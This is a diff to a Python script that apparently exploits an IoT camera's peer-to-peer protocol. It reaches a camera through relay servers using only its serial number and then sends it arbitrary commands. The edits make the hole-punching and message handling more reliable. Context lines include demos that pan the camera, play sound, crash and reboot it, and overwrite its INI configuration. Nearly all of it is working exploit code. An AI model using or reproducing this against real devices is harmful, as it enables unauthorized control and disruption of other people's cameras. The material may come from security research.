@@ -195,13 +195,15 @@ def p2p_req(target_ip, target_port, source_ip, source_port, serial):
     alive_sent = False
 
     counter = 0
+    msg_punch_pkt_ctr = 0
+    exception_ctr = 0
 
     # P2P connection is ready after we receive the following:
     # MSG_PUNCH_PKT
     # MSG_P2P_RDY
     # MSG_ALIVE
 
-    while (counter < 50):
+    while (counter < 200):
         try:
             recv_data, source_address = sock.recvfrom(4096)
             recv_data  = recv_data.hex()
@@ -209,11 +211,26 @@ def p2p_req(target_ip, target_port, source_ip, source_port, serial):
             relay_port = source_address[1]
         except Exception as e:
             # move on if the socket receive timed out or we have issues with parsing the data
-            return False
+            exception_ctr += 1
+            
+            if exception_ctr == 5:
+                print(e)
+                return False
+                
+            time.sleep(.5)
+            continue
 
-        if (recv_data == msg_punch_pkt_1) or (recv_data == msg_punch_pkt_2):
+        if (recv_data[:164] == msg_punch_pkt_1[:164]) or (recv_data[:164] == msg_punch_pkt_2[:164]):
             print("MSG_PUNCH_PKT: " + recv_data[:32])
-        elif (recv_data == msg_p2p_rdy_1) or (recv_data == msg_p2p_rdy_2):
+            msg_punch_pkt_ctr += 1
+            
+            if msg_punch_pkt_ctr == 4:
+                print("SENDING DIRECT MSG_PUNCH_PKT")
+                for i in range(0, 4):
+                    msg_punch_pkt(punch_ip_1, punch_port_1, serial, True)
+                msg_punch_pkt_ctr = 0
+            
+        elif (recv_data[:164] == msg_p2p_rdy_1[:164]) or (recv_data[:164] == msg_p2p_rdy_2[:164]):
             print("MSG_P2P_RDY: " + recv_data[:32])
             # if we receive this message, we need to send 3 alive messages
             for i in range(0, 3):
@@ -222,17 +239,34 @@ def p2p_req(target_ip, target_port, source_ip, source_port, serial):
             alive_sent = True
 
         elif recv_data == msg_alive:
-            print("MSG_ALIVE: " + recv_data[:32])
+            print("MSG_ALIVE: " + recv_data)
             alive_recv = True
         elif recv_data == msg_alive_ack:
-            print("MSG_ALIVE_ACK: " + recv_data[:32])
+            print("MSG_ALIVE_ACK: " + recv_data)
             alive_ack_recv = True
         elif recv_data == msg_close:
-            print("MSG_CLOSE: " + recv_data[:32])
+            print("MSG_CLOSE: " + recv_data)
             print("Stopping because we received early MSG_CLOSE!")
             return False
+        elif recv_data.startswith("f101"):
+            print("MSG_HELLO_ACK: " + recv_data)
+        elif recv_data.startswith("f121"):
+            print("MSG_P2P_REQ_ACK: " + recv_data)
+        elif recv_data.startswith("f140"):
+            print("MSG_PUNCH_TO: " + recv_data)
+        elif recv_data.startswith("f125"):
+            print("MSG_25: " + recv_data)
+        elif recv_data.startswith("f1d0"):
+            print("MSG_DRW: " + recv_data[:32])
+            # if we receive a MSG_DRW, we need to send a MSG_DRW_ACK back...
+            #MSG_DRW = f1d00088d100000048483031...
+            data_msg_index = recv_data[12:16]
+            #MSG_DRW_ACK = f1d10006d10000010000
+            msg_drw_ack = "f1d10006d1000001" + data_msg_index
+            send_packet(msg_drw_ack, relay_ip, relay_port)
+
         else:
-            print("MSG_UNKNOWN: " + recv_data[:32])
+            print("MSG_UNKNOWN????: " + recv_data)
 
         if alive_recv and alive_ack_recv and alive_sent:
             print("Connection has been established with camera; now we can send arbitrary commands / packets to camera")
@@ -240,11 +274,11 @@ def p2p_req(target_ip, target_port, source_ip, source_port, serial):
 
         counter += 1
 
-    print("Stopped because counter == 50")
+    print("Stopped because counter == 200")
     return False
 
 
-def msg_punch_pkt(target_ip, target_port, serial):
+def msg_punch_pkt(target_ip, target_port, serial, direct_target=False):
     # First send a packet to the target port (A)
     # After that, send packets to A-3, A-2, A-1, A, A+1, A+2, A+3; repeat this pattern two more times
     # Sample pattern:
@@ -253,6 +287,9 @@ def msg_punch_pkt(target_ip, target_port, serial):
     # After this sequence of packets is delivered, the target will respond with its own MSG_PUNCH_PKT packet
     data = "f1410058" + generate_uuid(serial) + "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" + "01" + "0000000000000000000000"
     send_packet(data, target_ip, target_port)
+
+    if direct_target:
+        send_packet(data, target_ip, target_port)
 
     # packets sent to port range detailed above
     for i in range(0, 3):
@@ -270,7 +307,6 @@ def msg_alive_thread(relay_ip, relay_port):
 
 # ==============
 # Demo Functions
-
 
 def demo_sound():
     p00 = "f1d00034d100" + "@@@@" + "4848303100000601000000000000000000000000000000000000000000007f0000000000000000000000000000000000"
@@ -314,11 +350,9 @@ def demo_sound():
         send_msg_drw(packet)
         time.sleep(.1)
 
-
 def demo_pan_cw():
     packet = "f1d00044d100" + "@@@@" + "4848303100001001100000000000000000000000000000000000000000007f000000000000000000000000000000000004010000000000000000000000000000"
     send_msg_drw(packet)
-
 
 def demo_pan_ccw():
     packet = "f1d00044d100" + "@@@@" + "4848303100001001100000000000000000000000000000000000000000007f000000000000000000000000000000000003010000000000000000000000000000"
@@ -335,11 +369,6 @@ def demo_tilt_up():
     send_msg_drw(packet)
 
 
-def demo_stop_pan_tilt():
-    packet = "f1d00044d100" + "@@@@" + "4848303100001001100000000000000000000000000000000000000000007f000000000000000000000000000000000000010000000000000000000000000000"
-    send_msg_drw(packet)
-
-
 def demo_pan_cruise():
     packet = "f1d00044d100" + "@@@@" + "4848303100001001100000000000000000000000000000000000000000007f000000000000000000000000000000000033010000000000000000000000000000"
     send_msg_drw(packet)
@@ -347,6 +376,11 @@ def demo_pan_cruise():
 
 def demo_tilt_cruise():
     packet = "f1d00044d100" + "@@@@" + "4848303100001001100000000000000000000000000000000000000000007f000000000000000000000000000000000031010000000000000000000000000000"
+    send_msg_drw(packet)
+
+
+def demo_stop():
+    packet = "f1d00044d100" + "@@@@" + "4848303100001001100000000000000000000000000000000000000000007f000000000000000000000000000000000000010000000000000000000000000000"
     send_msg_drw(packet)
 
 
@@ -404,10 +438,6 @@ def demo_crash_reboot():
 #          Do not use unless you have the means to restore the original contents of the INI file
 def demo_set_ini():
     for i in range(0, 5):
-        # product_name = `abcdefgHH01
-        # model = IJKLMNOPQRSTUVWXYZ[\]^_`abcdefgHH01
-        # vendor = @
-        # serialnum = defgHH01
         packet = "f1d0004fd100" + "@@@@"+ "484830310000" + "1402" + "400100004142434445464748494a4b4c4d4e4f5051527f535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e"
         #                                                                    A B ...                       P Q R   S               [ \ ] ^ _ ` a b c d e f g h i j k l m n o p q r s t u v w x y z { | } ~
         # this triggers on the fifth event
@@ -424,24 +454,37 @@ def demo_set_ini():
 def main(serial):
     global sock
     source_ip = socket.gethostbyname(socket.gethostname())
-    source_port = random.randint(10000, 60000)
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind((source_ip, source_port))
-    sock.settimeout(1)
+    #source_port = random.randint(10000, 60000)
+    #sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    #sock.bind((source_ip, source_port))
+    #sock.settimeout(1)
 
     for i in range(0, 25):
         for p2p_ip in p2p_servers:
             print("=" * 50)
-            for j in range(0, 3):
+            #for j in range(0, 3):
+            for j in range(0, 1):
+                try:
+                    sock.shutdown(socket.SHUT_RDWR)
+                    sock.close()
+                except:
+                    pass
+                
+                ###############
+                source_port = random.randint(10000, 60000)
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.bind((source_ip, source_port))
+                sock.settimeout(1)
+                ###############
                 print("-" * 50)
                 print("Connecting to P2P server " + p2p_ip + ":" + str(p2p_port) + " from " + source_ip + ":" + str(source_port))
-
+                
                 if not msg_hello(p2p_ip, p2p_port):
-                    time.sleep(.1)
+                    time.sleep(1)
                     continue
 
                 if not p2p_req(p2p_ip, p2p_port, source_ip, source_port, serial):
-                    time.sleep(.1)
+                    time.sleep(1)
                     continue
 
                 # To ensure we remain connected to the camera, spin off a separate thread that sends a MSG_ALIVE packet every second
